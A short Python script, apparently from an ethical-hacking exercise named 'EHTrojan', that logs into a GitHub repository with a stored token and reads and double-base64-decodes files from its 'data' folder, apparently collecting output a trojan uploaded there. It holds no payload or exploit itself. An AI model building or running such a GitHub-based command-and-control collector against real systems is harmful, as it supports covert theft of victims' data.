import base64
import github3
from rich import print as rprint
import time

def github_connect():
    with open("./mytoken.txt") as f:
        token = f.read()
    user = "DJochen1"
    sess = github3.login(token=token)
    return sess.repository(user, "EHTrojan")


def printRich(inhoud):
    for a in inhoud:
        if inhoud.index(a) % 2 == 0:
            rprint(f"\tinhoud: {a}")
        else:
            try:
                rprint(f"{a}\n")
            except:
                print("")

def get_file_list(file, repo):
    b64_data = repo.file_list("data/" + file).content
    data = base64.b64decode(b64_data)
    datadata = base64.b64decode(data)
    return datadata

def main():
    list = []
    try:
        repo = github_connect()
        dir = repo.directory_contents("data/")
        if dir is not None:
            for a in dir:
                list.append(a[0])
                list.append(get_file_list(a[0], repo))

    except Exception as e:
        print(e)
        print("geen inhoud")

    printRich(list)


if __name__ == "__main__":
    main()